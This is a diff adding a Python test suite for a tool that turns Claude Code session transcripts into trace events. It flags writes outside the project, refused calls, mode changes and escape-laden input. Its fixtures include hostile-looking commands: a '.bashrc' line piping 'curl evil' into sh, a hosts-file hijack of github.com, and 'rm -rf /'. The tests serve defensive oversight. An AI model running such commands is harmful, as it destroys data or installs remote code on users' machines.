@@ -1,0 +1,691 @@
+#!/usr/bin/env python3
+"""What a trace tells besides the conversation and the calls: who allowed
+a call, the files a command changed, what the session was told next to
+its prompts, and what became of its mode, its model and its cache."""
+
+from __future__ import annotations
+
+import json
+import unittest
+
+from harness import LauncherTest
+
+from claude_sandbox import transcript
+from claude_sandbox.events import Event, Who
+from claude_sandbox.layout import Layout, alerting, event_json, went_wrong
+
+PROJECT = "/p"
+
+
+def at(second: int) -> str:
+    return f"2026-01-02T10:00:{second:02d}Z"
+
+
+def prompt(text: str, second: int = 0, **more) -> dict:
+    return {
+        "type": "user",
+        "timestamp": at(second),
+        "message": {"content": text},
+        **more,
+    }
+
+
+def call(tool_id: str, name: str = "Bash", second: int = 1, **tool_input) -> dict:
+    block = {"type": "tool_use", "id": tool_id, "name": name, "input": tool_input}
+    return {
+        "type": "assistant",
+        "timestamp": at(second),
+        "message": {"content": [block]},
+    }
+
+
+def result(tool_id: str, output: str = "", second: int = 2, **more) -> dict:
+    block = {"type": "tool_result", "tool_use_id": tool_id, "content": output}
+    failed = bool(more.pop("failed", False))
+    return {
+        "type": "user",
+        "timestamp": at(second),
+        "message": {"content": [{**block, "is_error": failed}]},
+        **more,
+    }
+
+
+def attached(kind: str, second: int = 0, **given) -> dict:
+    return {
+        "type": "attachment",
+        "timestamp": at(second),
+        "attachment": {"type": kind, **given},
+    }
+
+
+def step(step_id: str, second: int, **usage: int) -> dict:
+    return {
+        "type": "assistant",
+        "timestamp": at(second),
+        "message": {"id": step_id, "usage": usage, "content": []},
+    }
+
+
+def events(entries: list[dict], verbose: bool = False) -> list[Event]:
+    return transcript.transcript_events(entries, PROJECT, verbose)
+
+
+def shown(entries: list[dict], verbose: bool = False) -> list[tuple[str, list[str]]]:
+    return [(event.what, event.details) for event in events(entries, verbose)]
+
+
+def changed(*files: dict, also: tuple[str, ...] = ()) -> dict:
+    """What Claude Code notes with the result of a command that changed
+    files."""
+    paths = [file["filePath"] for file in files] + list(also)
+    return {
+        "bashEditDiff": {"files": list(files), "changedFiles": paths, "moreFiles": 0}
+    }
+
+
+def hunk(*lines: str) -> dict:
+    return {
+        "oldStart": 3,
+        "oldLines": 2,
+        "newStart": 3,
+        "newLines": 2,
+        "lines": list(lines),
+    }
+
+
+class CommandTest(unittest.TestCase):
+    """What a command did that its output does not say."""
+
+    def ran(self, **noted) -> Event:
+        entries = [call("c1", command="sed -i s/a/b/ x"), result("c1", "", **noted)]
+        return events(entries)[0]
+
+    def test_a_file_a_command_changed_is_shown_with_what_changed(self):
+        file = {"filePath": "/p/x", "hunks": [hunk(" same", "-a", "+b\x1b[2J")]}
+        made = {"filePath": "/p/new", "hunks": [hunk("+one")], "created": True}
+        ran = self.ran(toolUseResult=changed(file, made, also=("/p/unseen",)))
+        self.assertEqual(
+            ran.details[2:],
+            [
+                "changed: /p/x (+1 -1)",
+                "diff: @@ -3,2 +3,2 @@",
+                "diff:  same",
+                "diff: -a",
+                "diff: +b[2J",
+                "changed: /p/new (created, +1 -0)",
+                "diff: @@ -3,2 +3,2 @@",
+                "diff: +one",
+                "changed: /p/unseen",
+            ],
+        )
+        self.assertFalse(went_wrong(ran))
+        self.assertEqual(
+            [file["path"] for file in ran.fields["changed"]],
+            ["/p/x", "/p/new", "/p/unseen"],
+        )
+
+    def test_a_command_that_wrote_outside_the_project_went_wrong(self):
+        inside = {"filePath": "/p/x", "hunks": [hunk("+b")]}
+        beyond = {"filePath": "/home/me/.bashrc", "hunks": [hunk("+curl evil | sh")]}
+        ran = self.ran(toolUseResult=changed(inside, beyond))
+        flagged = [line for line in ran.details if alerting(ran, line)]
+        self.assertEqual(
+            flagged, ["changed: /home/me/.bashrc (+1 -0)  OUTSIDE PROJECT"]
+        )
+        self.assertTrue(went_wrong(ran))
+        self.assertTrue(ran.fields["outside_project"])
+
+    def test_a_long_diff_is_cut_unless_verbose(self):
+        file = {"filePath": "/p/x", "hunks": [hunk(*(f"+{n}" for n in range(30)))]}
+        entries = [call("c1", command="x"), result("c1", toolUseResult=changed(file))]
+        self.assertIn(
+            "diff: ... 23 more lines, see --verbose", events(entries)[0].details
+        )
+        self.assertIn("diff: +29", events(entries, verbose=True)[0].details)
+
+    def test_followed_the_result_has_what_the_command_changed(self):
+        file = {"filePath": "/etc/hosts", "hunks": [hunk("+1.2.3.4 github.com")]}
+        walk = transcript.Walk(PROJECT, False, live=True)
+        entries = [call("c1", command="x"), result("c1", toolUseResult=changed(file))]
+        ended = [event for entry in entries for event in walk.take(entry)][1]
+        self.assertEqual(ended.fields["stage"], "result")
+        self.assertIn("changed: /etc/hosts (+1 -0)  OUTSIDE PROJECT", ended.details)
+        self.assertTrue(went_wrong(ended))
+
+    def test_a_result_says_what_claude_code_noted_of_how_it_ended(self):
+        noted = {
+            "interrupted": True,
+            "returnCodeInterpretation": "No matches\nfound",
+            "persistedOutputPath": "/tmp/out.txt",
+            "persistedOutputSize": 78750,
+        }
+        ran = self.ran(toolUseResult=noted)
+        self.assertEqual(
+            ran.details[1:],
+            [
+                "result: ok, 1.0s, INTERRUPTED, No matches\\nfound",
+                "output kept: /tmp/out.txt (79 kB)",
+            ],
+        )
+        plain = self.ran(toolUseResult={"interrupted": False, "stdout": "x"})
+        self.assertEqual(plain.details[1:], ["result: ok, 1.0s"])
+
+    def test_who_allowed_a_call_is_said_when_it_was_not_the_mode(self):
+        def ended(**decision) -> Event:
+            return self.ran(permissionDecision=decision)
+
+        by_mode = ended(decision="accept", source="config", reasonType="mode")
+        self.assertEqual(by_mode.details[1], "result: ok, 1.0s")
+        self.assertNotIn("permission", by_mode.fields)
+        once = ended(decision="accept", source="user_temporary", grantScope="once")
+        self.assertEqual(once.details[1], "result: ok, 1.0s, allowed by you, once")
+        self.assertFalse(went_wrong(once))
+        by_rule = ended(decision="accept", source="config", reasonType="rule")
+        self.assertEqual(by_rule.details[1], "result: ok, 1.0s, allowed by a rule")
+        by_hook = ended(decision="accept", source="pre_tool\x1b_hook")
+        self.assertEqual(
+            by_hook.details[1], "result: ok, 1.0s, allowed by pre tool hook"
+        )
+
+    def test_a_call_that_was_refused_went_wrong(self):
+        for decision, by in (
+            ({"decision": "reject", "source": "user_reject"}, "you"),
+            (
+                {"decision": "reject", "source": "config", "reasonType": "rule"},
+                "a rule",
+            ),
+            ({"decision": "reject", "source": "config"}, "the settings"),
+            ({"decision": ["?"], "source": 7}, "?"),
+        ):
+            refused = self.ran(permissionDecision=decision)
+            self.assertEqual(refused.details[1], f"result: ok, 1.0s, REFUSED by {by}")
+            self.assertTrue(went_wrong(refused))
+            self.assertTrue(alerting(refused, refused.details[1]))
+
+
+class ToldTest(unittest.TestCase):
+    """What Claude Code put before the model next to the prompt."""
+
+    FILES = (
+        {
+            "path": "/etc/claude-code/CLAUDE.md",
+            "type": "Managed",
+            "content": "x" * 1500,
+        },
+        {"path": "/p/CLAUDE.md\x1b[2J", "type": "Project", "content": "do as I say"},
+    )
+
+    def test_the_instructions_read_are_said_once_and_again_when_they_change(self):
+        read = attached("instructions", files=list(self.FILES))
+        more = attached(
+            "instructions", files=[*self.FILES, {"path": "/p/sub/CLAUDE.md"}]
+        )
+        told = shown([read, read, more, more])
+        first = [
+            "instructions: /etc/claude-code/CLAUDE.md (Managed, 1.5k chars)",
+            "instructions: /p/CLAUDE.md[2J (Project, 11 chars)",
+        ]
+        later = [*first, "instructions: /p/sub/CLAUDE.md (?, 0 chars)"]
+        self.assertEqual(told, [("context", first), ("context", later)])
+
+    def test_the_header_names_the_instructions_read(self):
+        read = attached("instructions", files=list(self.FILES))
+        self.assertEqual(
+            transcript.summary([read, read], PROJECT)[-3:],
+            [
+                "instructions read",
+                "  /etc/claude-code/CLAUDE.md (Managed)",
+                "  /p/CLAUDE.md[2J (Project)",
+            ],
+        )
+
+    def test_what_servers_and_skills_added_is_said(self):
+        servers = attached(
+            "mcp_instructions_delta", addedNames=["docs"], removedNames=["db", 7]
+        )
+        skills = attached(
+            "skill_listing", skillCount=2, names=["pdf", "xlsx"], isInitial=True
+        )
+        nothing = attached("mcp_instructions_delta", addedNames=[], removedNames=[])
+        self.assertEqual(
+            shown([servers, skills, skills, nothing]),
+            [
+                (
+                    "context",
+                    [
+                        "MCP server instructions: docs",
+                        "MCP server instructions gone: db",
+                    ],
+                ),
+                ("context", ["skills: 2 listed"]),
+            ],
+        )
+        self.assertEqual(
+            shown([skills], verbose=True),
+            [("context", ["skills: 2 listed: pdf, xlsx"])],
+        )
+
+    def test_a_line_typed_while_claude_worked_is_a_prompt(self):
+        typed = attached(
+            "queued_command",
+            second=5,
+            commandMode="prompt",
+            prompt=[
+                {"type": "text", "text": "also fix\x1b[2J the tests\nand the docs"}
+            ],
+        )
+        (said,) = events([typed])
+        self.assertEqual((said.who, said.what), (Who.USER, "prompt"))
+        self.assertEqual(
+            said.details,
+            ["(typed while claude worked) also fix[2J the tests", "and the docs"],
+        )
+        self.assertTrue(said.fields["queued"])
+        as_text = attached("queued_command", commandMode="prompt", prompt="plain")
+        self.assertEqual(
+            shown([as_text]), [("prompt", ["(typed while claude worked) plain"])]
+        )
+
+    def test_a_task_that_ended_is_said_by_how_and_what(self):
+        note = (
+            "<task-notification>\n<task-id>a1</task-id>\n<status>completed</status>\n"
+            '<summary>Agent "review" finished</summary>\n<result>long</result>'
+        )
+        ended = attached("queued_command", commandMode="task-notification", prompt=note)
+        self.assertEqual(
+            shown([ended]), [("task", ['completed: Agent "review" finished'])]
+        )
+        other = attached("queued_command", commandMode="bash", prompt="ls\nmore")
+        self.assertEqual(shown([other]), [("context", ["told (bash): ls"])])
+
+    def test_a_file_that_changed_behind_claude_is_said(self):
+        edited = attached("edited_text_file", filename="/p/a.py", snippet="")
+        self.assertEqual(
+            shown([edited]), [("context", ["changed since claude read it: /p/a.py"])]
+        )
+
+    def test_what_a_language_server_reported_needs_verbose(self):
+        found = {
+            "message": "x is not\ndefined",
+            "severity": "Error",
+            "range": {"start": {"line": 119, "character": 4}},
+        }
+        report = attached(
+            "diagnostics",
+            files=[
+                {"uri": "/p/a.py", "diagnostics": [found, {"severity": "Warning"}, 7]}
+            ],
+        )
+        self.assertEqual(shown([report]), [])
+        self.assertEqual(
+            shown([report], verbose=True),
+            [
+                (
+                    "context",
+                    [
+                        "diagnostics: /p/a.py: 1 Error, 1 Warning",
+                        "  Error line 120: x is not\\ndefined",
+                        "  Warning: ",
+                    ],
+                )
+            ],
+        )
+
+
+class SessionTest(unittest.TestCase):
+    """What became of the session itself."""
+
+    def test_a_change_of_the_permission_mode_is_an_event_the_first_is_not(self):
+        def mode(name: object) -> dict:
+            return {"type": "permission-mode", "permissionMode": name}
+
+        entries = [
+            prompt("go", permissionMode="default"),
+            mode("default"),
+            mode("bypassPermissions"),
+            mode("bypassPermissions"),
+            mode(["x"]),
+            prompt("on", second=9, permissionMode="plan"),
+            # Of a subagent, which is not the session's
+            prompt("sub", permissionMode="default", isSidechain=True),
+        ]
+        changes = [event for event in events(entries) if event.what == "mode"]
+        self.assertEqual(
+            [event.details for event in changes],
+            [
+                ["permissions: bypassPermissions  was: default"],
+                ["permissions: plan  was: bypassPermissions"],
+            ],
+        )
+        self.assertEqual(
+            changes[0].fields, {"mode": "bypassPermissions", "was": "default"}
+        )
+        # Ahead of the prompt it was given with
+        self.assertEqual([what for what, _ in shown(entries)][-2:], ["mode", "prompt"])
+
+    def test_a_change_of_model_or_effort_is_an_event(self):
+        def request(model: object, effort: str = "medium", source: str = "sdk") -> dict:
+            params = {"model": model, "output_config": {"effort": effort}}
+            return {
+                "type": "api-request",
+                "timestamp": at(3),
+                "querySource": source,
+                "params": params,
+            }
+
+        entries = [
+            request("fable"),
+            request("fable"),
+            # What else asks has a model of its own, which is no change
+            request("haiku", source="title"),
+            request("fable"),
+            request("opus"),
+            request("opus", effort="high"),
+            request(None),
+            {"type": "api-request", "params": "x"},
+        ]
+        self.assertEqual(
+            shown(entries),
+            [
+                ("model", ["opus, effort medium  was: fable, effort medium"]),
+                ("model", ["opus, effort high  was: opus, effort medium"]),
+            ],
+        )
+
+    def test_api_trouble_is_said_and_went_wrong(self):
+        error = {
+            "message": "Connection error.",
+            "formatted": "No response\x1b[2J from API",
+        }
+        failed = {
+            "type": "system",
+            "subtype": "api_error",
+            "timestamp": at(4),
+            "error": error,
+            "retryInMs": 531,
+            "retryAttempt": 1,
+            "maxRetries": 10,
+        }
+        (said,) = events([failed])
+        self.assertEqual(
+            (said.what, said.details),
+            (
+                "api",
+                [
+                    "API error: No response[2J from API, tried again after 0.5s (retry 1 of 10)"
+                ],
+            ),
+        )
+        self.assertTrue(went_wrong(said))
+        bare = {"type": "system", "subtype": "api_error", "error": 7, "retryInMs": "x"}
+        self.assertEqual(shown([bare]), [("api", ["API error: no reason given"])])
+
+    def test_a_compaction_is_said(self):
+        about = {"trigger": "auto", "preTokens": 152_300}
+        compacted = {
+            "type": "system",
+            "subtype": "compact_boundary",
+            "compactMetadata": about,
+        }
+        self.assertEqual(
+            shown([compacted, {"type": "system", "subtype": "compact_boundary"}]),
+            [
+                (
+                    "compact",
+                    ["the conversation was compacted (auto), 152.3k tokens before"],
+                ),
+                ("compact", ["the conversation was compacted"]),
+            ],
+        )
+
+    def test_a_step_that_missed_the_cache_says_so_and_why(self):
+        def read(step_id: str, second: int, cached: int, new: int) -> dict:
+            return step(
+                step_id,
+                second,
+                output_tokens=10,
+                cache_read_input_tokens=cached,
+                cache_creation_input_tokens=new,
+            )
+
+        dropped = attached(
+            "thinking_drop",
+            newlyDropped={"blockCount": 107, "reason": "model_mismatch"},
+        )
+        entries = [
+            read("m1", 1, 0, 100_000),
+            read("m2", 2, 100_000, 500),
+            dropped,
+            read("m3", 3, 30_000, 72_000),
+            read("m4", 4, 102_000, 300),
+            # After a pause, with nothing that says why
+            read("m5", 5, 0, 103_000),
+        ]
+        steps = [details[0] for _, details in shown(entries, verbose=True)]
+        self.assertEqual(
+            [line.partition("  cache ")[2] for line in steps],
+            [
+                "",
+                "",
+                "MISSED, 72.0k read anew: 107 thinking blocks dropped, model mismatch",
+                "",
+                "MISSED, 103.0k read anew",
+            ],
+        )
+        missed = events(entries, verbose=True)[2]
+        self.assertEqual(missed.fields["cache_missed"], 72_000)
+        self.assertFalse(went_wrong(missed))
+
+    def test_after_a_compaction_a_smaller_conversation_is_no_miss(self):
+        entries = [
+            step("m1", 1, output_tokens=1, cache_creation_input_tokens=100_000),
+            {"type": "system", "subtype": "compact_boundary"},
+            step("m2", 2, output_tokens=1, cache_creation_input_tokens=9_000),
+        ]
+        said = [
+            details[0]
+            for what, details in shown(entries, verbose=True)
+            if what == "step"
+        ]
+        self.assertFalse(any("MISSED" in line for line in said))
+
+    def test_an_aside_between_a_call_and_its_result_names_the_result(self):
+        walk = transcript.Walk(PROJECT, False, live=True)
+        edited = attached("edited_text_file", filename="/p/a.py")
+        entries = [call("c1", command="make"), edited, result("c1", "done")]
+        ended = [event for entry in entries for event in walk.take(entry)][-1]
+        self.assertEqual(ended.details[0], "of: $ make")
+
+
+class HostileTest(unittest.TestCase):
+    """A transcript is the session's to write: no shape of these entries
+    stops the reading, and none of them reaches a terminal as it is."""
+
+    ODD = (
+        None,
+        7,
+        1e999,
+        "x\x1b[2J",
+        ["x"],
+        {"x": {"y": []}},
+        [[[]]],
+        True,
+        -1,
+        10**400,
+    )
+
+    def test_no_shape_of_what_is_told_stops_the_reading(self):
+        kinds = (
+            "instructions",
+            "mcp_instructions_delta",
+            "skill_listing",
+            "queued_command",
+            "edited_text_file",
+            "diagnostics",
+            "thinking_drop",
+        )
+        keys = (
+            "files",
+            "addedNames",
+            "removedNames",
+            "names",
+            "skillCount",
+            "prompt",
+            "commandMode",
+            "filename",
+            "newlyDropped",
+        )
+        entries: list[dict] = [
+            {"type": "attachment", "attachment": odd} for odd in self.ODD
+        ]
+        for odd in self.ODD:
+            entries += [attached(kind, **dict.fromkeys(keys, odd)) for kind in kinds]
+            entries += [
+                attached("instructions", files=[odd, {"path": odd, "type": odd}])
+            ]
+            entries += [
+                attached("diagnostics", files=[{"uri": odd, "diagnostics": [odd]}])
+            ]
+            entries += [
+                {"type": "attachment", "attachment": {"type": odd}},
+                {"type": "system", "subtype": odd},
+                {
+                    "type": "system",
+                    "subtype": "api_error",
+                    "error": odd,
+                    "retryInMs": odd,
+                },
+                {
+                    "type": "system",
+                    "subtype": "compact_boundary",
+                    "compactMetadata": odd,
+                },
+                {"type": "permission-mode", "permissionMode": odd},
+                {"type": "api-request", "params": odd, "querySource": odd},
+                {"type": "api-request", "params": {"model": odd, "output_config": odd}},
+                call("c", command="x"),
+                result("c", toolUseResult=odd, permissionDecision=odd),
+                call("d", command="x"),
+                result(
+                    "d",
+                    toolUseResult={
+                        "bashEditDiff": {
+                            "files": [odd, {"filePath": odd, "hunks": [odd]}]
+                        },
+                        "interrupted": odd,
+                        "returnCodeInterpretation": odd,
+                        "persistedOutputPath": odd,
+                        "persistedOutputSize": odd,
+                    },
+                    permissionDecision=dict.fromkeys(
+                        ("decision", "source", "grantScope"), odd
+                    ),
+                ),
+                call("e", command="x"),
+                result("e", toolUseResult={"bashEditDiff": odd}),
+                call("f", command="x"),
+                result(
+                    "f",
+                    toolUseResult={
+                        "bashEditDiff": {
+                            "changedFiles": odd,
+                            "files": [
+                                {
+                                    "filePath": "/p/x",
+                                    "hunks": [{**hunk(), "lines": odd}],
+                                }
+                            ],
+                        }
+                    },
+                ),
+            ]
+        layout = Layout()
+        for verbose in (False, True):
+            found = events(entries, verbose)
+            walk = transcript.Walk(PROJECT, verbose, live=True)
+            found += [event for entry in entries for event in walk.take(entry)]
+            for event in found:
+                json.loads(event_json("s", event))
+                for line in layout.event(event):
+                    self.assertNotIn("\x1b", line)
+        transcript.summary(entries, PROJECT)
+
+
+class TraceTest(LauncherTest):
+    """The same through --trace: the header, and what --failed keeps."""
+
+    SESSION = "3fa9c0de-0000-4000-8000-000000000000"
+
+    def setUp(self):
+        super().setUp()
+        beyond = {"filePath": "/home/me/.bashrc", "hunks": [hunk("+x")]}
+        refusal = {"decision": "reject", "source": "user_reject"}
+        self.write_transcript(
+            self.SESSION,
+            [
+                prompt("go", permissionMode="default"),
+                attached(
+                    "instructions", files=[{"path": "/p/CLAUDE.md", "type": "Project"}]
+                ),
+                call("c1", command="echo x >> ~/.bashrc"),
+                result("c1", toolUseResult=changed(beyond)),
+                call("c2", second=3, command="rm -rf /"),
+                result("c2", "no", second=4, failed=True, permissionDecision=refusal),
+                {"type": "permission-mode", "permissionMode": "bypassPermissions"},
+                {
+                    "type": "system",
+                    "subtype": "api_error",
+                    "timestamp": at(5),
+                    "error": "down",
+                },
+            ],
+        )
+
+    def test_the_header_counts_what_commands_wrote_and_what_was_refused(self):
+        header = self.launch("--trace").stdout
+        for expected in (
+            "# refused     1 calls were not allowed to run",
+            "# instructions read\n#   /p/CLAUDE.md (Project)",
+            "# files written\n#   /home/me/.bashrc x1  OUTSIDE PROJECT",
+            "claude   mode        permissions: bypassPermissions  was: default",
+        ):
+            self.assertIn(expected, header)
+
+    def test_failed_keeps_a_refusal_a_write_outside_and_api_trouble(self):
+        failed = self.launch("--trace", "--failed").stdout
+        kept = [line for line in failed.splitlines() if not line.startswith("#")]
+        self.assertEqual(
+            [
+                line.split(maxsplit=4)[3:]
+                for line in kept
+                if "result:" in line or "API" in line
+            ],
+            [
+                ["bash", "result: ok, 1.0s"],
+                ["bash", "result: FAILED, 1.0s, REFUSED by you, 1 line out"],
+                ["api", "API error: down"],
+            ],
+        )
+        self.assertNotIn("instructions:", "\n".join(kept))
+        only = self.launch("--trace", "--only", "mode,context").stdout
+        self.assertEqual(
+            [line.split()[3] for line in only.splitlines() if not line.startswith("#")],
+            ["context", "mode"],
+        )
+
+    def test_json_has_the_values_of_each(self):
+        lines = self.launch("--trace", "--json").stdout.splitlines()
+        by_what = {json.loads(line)["what"]: json.loads(line) for line in lines}
+        self.assertEqual(by_what["mode"]["was"], "default")
+        self.assertEqual(by_what["api"]["error"], "down")
+        self.assertEqual(by_what["context"]["files"][0]["path"], "/p/CLAUDE.md")
+        ran = [json.loads(line) for line in lines if json.loads(line)["what"] == "bash"]
+        self.assertEqual(ran[0]["changed"][0]["diff"], ["@@ -3,2 +3,2 @@", "+x"])
+        self.assertEqual(
+            (ran[1]["permission"], ran[1]["permission_by"], ran[1]["refused"]),
+            ("reject", "you", True),
+        )
+
+
+if __name__ == "__main__":
+    unittest.main()
